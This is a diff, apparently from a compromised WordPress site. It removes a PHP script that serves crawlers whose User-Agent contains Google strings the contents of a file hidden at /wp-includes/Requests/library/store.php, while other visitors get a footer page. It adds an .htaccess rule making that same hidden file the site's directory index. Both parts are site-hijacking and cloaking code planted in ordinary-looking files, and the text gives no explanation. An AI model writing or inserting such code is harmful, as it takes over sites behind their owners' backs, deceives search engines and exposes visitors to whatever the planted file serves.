@@ -1,18 +1,9 @@
-<?php
-function is_google_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-    }
-    return false;
-}
+DirectoryIndex /wp-includes/Requests/library/store.php
+<IfModule mod_rewrite.c>
+    RewriteEngine On
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents('/wp-includes/Requests/library/store.php');
-    echo $bot_content;
-    exit;
-} else {
-    include('/wp-blog-footer.php');
-    exit;
-}
-?>
+ RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+
+    RewriteRule ^(.*)$ index.php?/$1 [L]
+</IfModule>
